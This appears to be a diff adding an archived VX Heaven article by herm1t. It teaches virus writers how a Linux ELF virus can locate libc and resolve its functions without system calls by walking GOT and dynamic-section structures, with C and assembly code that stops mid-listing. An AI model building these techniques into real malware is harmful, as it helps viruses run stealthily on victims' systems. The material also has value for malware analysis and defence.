@@ -1,0 +1,441 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> herm1t 'INT 0x80? No, thank you!' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="herm1t"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, herm1t,INT 0x80? No, thank you!, uint, push, loop, delta, vaddr, addr, text, printf, dword, main, type, libc, linker, unwind, prot"/>
+<meta name="Description" content="After finishing the Lacrimae virus which is able to extend any section and thus import library functions, I spent some time thinking how an ordinary virus can use the libc or any other library. There are a lot of opportunities for the viruses having such a feature. Here I wish to present a method to do it, using test virus Linux.Pilot as an example."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"fa6de25f5c433d9b302a79dacc053f7700f3069a-1498756515-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vhe05.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>INT 0x80? No, thank you!</h1><p><a href="/lib/?lang=en&amp;author=herm1t"> herm1t</a><br/> <em><a href="/vx.php?fid=1581#f1581">Electrical Ordered Freedom #2 (EOF-DR-RRLF)</a></em><br/> <em>November 2007</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vhe05.html';</script><div class="ci"><a href="/lib/?ci=vhe05">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=UN#vhe05">Back to index</a>] [<a href="/lib/vhe05.html#disqus_thread">Comments</a>]<br/> 
+<h2>Introduction</h2>
+<p>After finishing the Lacrimae virus which is able to extend any section and thus import library functions, I spent some time thinking how an ordinary virus can use the libc or any other library. There are a lot of opportunities for the viruses having such a feature. Here I wish to present a method to do it, using test virus Linux.Pilot as an example.</p>
+<p>As late as in 2002 the grugq published a nice method of resolving symbols at run-time utilizing the pointer to the <code>link_map</code> structure, saved within program's GOT by dynamic linker [1]. As another BugTraq writer stated - this was known even earlier, but to my great surprise, I didn't saw any virus using this technique. My results were similar to the ones obtained by grugq, though I decided do not use link_map. There is a another method, more simple and independent of how lazy the dynamic linker is.</p>
+<h2>Obtaining libc address</h2>
+<p>We will make advantage of the fact that the dynamic linker and (most likely) the program are using libc. To obtain the base address of libc and, hence, the access to its functions and symbol table (to find function addresses) we will subsequently examine the contents of the global offset table in current process, dynamic linker and libc. The memory after loading the executable (and all its libraries) may look as follows:</p>
+<pre>
+      <strong>Lazy linking                             "Immediate" linking</strong>
+      <strong>/lib/tls/libc.so.6</strong>
+      .text                                    .text
+      malloc: &lt;------+                         
+                     |                         libcfoo: &lt;-----+
+      <strong>/lib/ld-linux.so.2</strong>                                      |
+      .text          |                         .text          |
+      _dl_runtime_resolve: &lt;--+                               |
+                     |        |                               |
+      .got.plt       |        |                .got.plt       |
+GOT[0]|          |   |        |                |          |   |
+GOT[1]|          |   |        |                |          |   |
+GOT[2]|          |   |        |                |          |   |
+GOT[3]| memalign |   |        |                | memalign |   |
+GOT[4]| malloc   | --+        |                | malloc   |   |
+                              |                               |
+      <strong>Program</strong>                 |                               |
+      .plt push  GOT[1]       |                .plt           |
+           jmp   GOT[2]       |                               |
+      .plt+16                 |                .plt+16        |
+      <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="96fafff4f5f0f9f9d6e6fae2">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:            |                               |
+           jmp   GOT[3]       |                    jmp GOT[3] |
+           push  0 &lt;----+     |                               |
+           jmp   .plt   |     |                               |
+      .got.plt          |     |                .got.plt       |
+GOT[0]| .dynamic |      |     |                | .dynamic |   |
+GOT[1]| link_map |      |     |                |          |   |
+GOT[2]| _resolve | -----|-----+                |       0  |   |
+GOT[3]| libcfoo  | -----+                      | libcfoo  | --+        
+</pre>
+<p>The actions for each step are much the same:</p>
+<ul>
+<li>Having arbitrary address within .text, find the base address
+<ul>
+<li>Align address to the page boundary</li>
+<li>Do we have ELF header at this address?</li>
+<li>No? Substract page size from address and check again.</li>
+</ul>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> <span style="color: #339933;">*</span>get_base<span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span> addr<span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; addr <span style="color: #339933;">&amp;=</span> ~<span style="color: #0000dd;">4095</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">while</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>addr <span style="color: #339933;">!=</span> 0x464c457fUL<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; addr <span style="color: #339933;">-=</span> <span style="color: #0000dd;">4096</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span>addr<span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div></li>
+<li>Find dynamic segment in PHT (entry with type PT_DYNAMIC) and the delta between file's lowest address and actual memory location
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">void</span> get_dyn_file_base<span style="color: black;">&#40;</span><span style="color: #993333;">uint8_t</span> <span style="color: #339933;">*</span>elf<span style="color: #339933;">,</span> Elf32_Dyn <span style="color: #339933;">**</span>dynamic<span style="color: #339933;">,</span> <span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>delta<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> i<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Phdr <span style="color: #339933;">*</span>phdr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> dyn<span style="color: #339933;">,</span> low <span style="color: #339933;">=</span> <span style="color: #208080;">0xffffffff</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; phdr <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Phdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>elf <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span>elf<span style="color: black;">&#41;</span><span style="color: #339933;">-&gt;</span>e_phoff<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">for</span> <span style="color: black;">&#40;</span>i <span style="color: #339933;">=</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">;</span> i <span style="color: #339933;">&lt;</span> <span style="color: black;">&#40;</span><span style="color: black;">&#40;</span>Elf32_Ehdr<span style="color: #339933;">*</span><span style="color: black;">&#41;</span>elf<span style="color: black;">&#41;</span><span style="color: #339933;">-&gt;</span>e_phnum<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>phdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">p_type</span> <span style="color: #339933;">==</span> PT_LOAD <span style="color: #339933;">&amp;&amp;</span> low <span style="color: #339933;">&gt;</span> phdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">p_vaddr</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; low <span style="color: #339933;">=</span> phdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">p_vaddr</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>phdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">p_type</span> <span style="color: #339933;">==</span> PT_DYNAMIC<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dyn <span style="color: #339933;">=</span> phdr<span style="color: black;">&#91;</span>i<span style="color: black;">&#93;</span>.<span style="color: #202020;">p_vaddr</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>delta <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span>elf <span style="color: #339933;">-</span> low<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">*</span>dynamic <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Dyn<span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>dyn <span style="color: #339933;">+</span> <span style="color: #339933;">*</span>delta<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div></li>
+<li>Find GOT address in DYNAMIC (entry with type DT_PLTGOT)
+<pre>
+void *get_from_dyn(Elf32_Dyn *dynamic, uint32_t tag)
+{
+	Elf32_Dyn *dyn;
+	for (dyn = dynamic; dyn->d_tag != DT_NULL; ++dyn)
+		if (dyn->d_tag == tag)
+			return (uint32_t*)dyn->d_un.d_ptr;
+	return NULL;
+}</pre></li>
+</ul>
+<p>This is exactly what <code>unwind</code> function is doing:</p>
+<pre>
+void unwind(uint32_t addr, uint32_t **got, Elf32_Dyn **dyn, uint32_t *delta)
+{
+	get_dyn_file_base(get_base(addr), dyn, delta);
+	*got = get_from_dyn(*dyn, DT_PLTGOT);
+	printf("unwind: GOT=%08x DYNAMIC=%08x DELTA=%08x\n", *got, *dyn, *delta);
+}
+</pre>
+<p>To start "unwinding" the loaded elves we need the address of GOT. You can either call <code>unwind</code> for some adress within the current process and get the address of GOT, or the address of GOT could be saved in the subsequent virus generation by the infection routine.</p>
+<p>By repeating this sequence with GOT[2] as argument we will get base, dynamic, delta and got of the dynamic linker. Since it is using the libc itself, let's do it one more time for linker's GOT[4] and we will find those addresses of libc. Now, one could use the hash and dynamic symbol table to resolve the addresses of functions. I'm using here GOT[4], not GOT[3], because in older version of libc it was reserved.</p>
+<p>If the executable was started with LD_BIND_NOW (all addresses were resolved before starting the program), run the <code>unwind</code> function once for any libc' GOT entry in the current process. For the sake of simplicity Linux.Pilot doesn't check if the GOT entry really intended to be filled with address of libc function, while one may find the <code>__libc_start_main</code>'s GOT entry (just to be sure).</p>
+<p>Consider the following example:</p>
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> main<span style="color: black;">&#40;</span><span style="color: #993333;">int</span> argc<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>argv<span style="color: #339933;">,</span> <span style="color: #993333;">char</span> <span style="color: #339933;">**</span>envp<span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#123;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>got<span style="color: #339933;">,</span> delta<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Dyn <span style="color: #339933;">*</span>dyn<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; unwind<span style="color: black;">&#40;</span><span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span>main<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>got<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>dyn<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span> delta<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>got<span style="color: black;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span><span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; unwind<span style="color: black;">&#40;</span>got<span style="color: black;">&#91;</span><span style="color: #0000dd;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>got<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>dyn<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span> delta<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; unwind<span style="color: black;">&#40;</span>got<span style="color: black;">&#91;</span><span style="color: #0000dd;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>got<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>dyn<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>delta<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Elf32_Sym <span style="color: #339933;">*</span>dynsym<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> <span style="color: #339933;">*</span>dynstr<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">uint32_t</span> <span style="color: #339933;">*</span>hash<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">void</span> <span style="color: black;">&#40;</span><span style="color: #339933;">*</span>printf_ptr<span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*,</span>...<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; dynsym <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span>Elf32_Sym<span style="color: #339933;">*</span><span style="color: black;">&#41;</span>get_from_dyn<span style="color: black;">&#40;</span>dyn<span style="color: #339933;">,</span> DT_SYMTAB<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; dynstr <span style="color: #339933;">=</span> get_from_dyn<span style="color: black;">&#40;</span>dyn<span style="color: #339933;">,</span> DT_STRTAB<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; hash <span style="color: #339933;">=</span> get_from_dyn<span style="color: black;">&#40;</span>dyn<span style="color: #339933;">,</span> DT_HASH<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; printf_ptr <span style="color: #339933;">=</span> <span style="color: black;">&#40;</span><span style="color: #993333;">void</span><span style="color: black;">&#40;</span><span style="color: #339933;">*</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span><span style="color: #993333;">char</span><span style="color: #339933;">*,</span>...<span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#40;</span>lookup<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;printf&quot;</span><span style="color: #339933;">,</span> hash<span style="color: #339933;">,</span> dynsym<span style="color: #339933;">,</span> dynstr<span style="color: black;">&#41;</span> <span style="color: #339933;">+</span> delta<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; printf_ptr<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;Hello, world! printf = %08x<span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #993333;">uint32_t</span><span style="color: black;">&#41;</span>printf_ptr<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<span style="color: black;">&#125;</span><br/>
+&nbsp;</div>
+<p>The <code>lookup</code> returns the st_value field from the matched dynamic symbol table entry. [2]</p>
+<p>The output of the sample program on the prelinked system may look like this:</p>
+<pre>
+$ ./a.out 
+unwind: GOT=08049914 DYNAMIC=08049848 DELTA=00000000
+unwind: GOT=0052afb4 DYNAMIC=0052aef4 DELTA=00000000
+unwind: GOT=0021fff4 DYNAMIC=0021fd1c DELTA=00000000
+Hello, world! printf = 00142810
+$ export LD_BIND_NOW=1 &amp;&amp; ./a.out 
+unwind: GOT=08049914 DYNAMIC=08049848 DELTA=00000000
+unwind: GOT=0021fff4 DYNAMIC=0021fd1c DELTA=00000000
+Hello, world! printf = 00142810
+</pre>
+<p>That's how we can obtain the addresses of functions within libc without single syscall.</p>
+<p>The above functions in assembler:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">unwind<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_base<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_dyn_file_base<br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; or&nbsp; &nbsp; &nbsp; eax, eax</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jz&nbsp; &nbsp; &nbsp; fail</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">edi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; DT_PLTGOT<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; get_from_dyn<br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; or&nbsp; &nbsp; &nbsp; eax, eax</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jz&nbsp; &nbsp; &nbsp; fail</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; get_base(addr) - return base address of the loaded ELF file</span><br/>
+get_base<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0xf000</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">loop</span><span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">eax</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">0</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0x464c457f</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; <span style="color: #339933;">.</span>next<br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; dword [eax + 4], 0x00010101</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; .next</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retn&nbsp; &nbsp; <span style="color: #ff0000;">4</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>next<span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4096</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">loop</span><br/>
+<span style="color: black; font-style: italic;">; get_from_dyn(DYNAMIC, tag) - return the DYNAMIC entry with given tag</span><br/>
+get_from_dyn<span style="color: #339933;">:</span> &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cld</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esp</span> <span style="color: #339933;">+</span> <span style="color: #ff0000;">8</span><span style="color: black;">&#93;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #00007f; font-weight: bold;">loop</span><span style="color: #339933;">:</span>&nbsp; <span style="color: #00007f; font-weight: bold;">lodsd</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>done<br/>
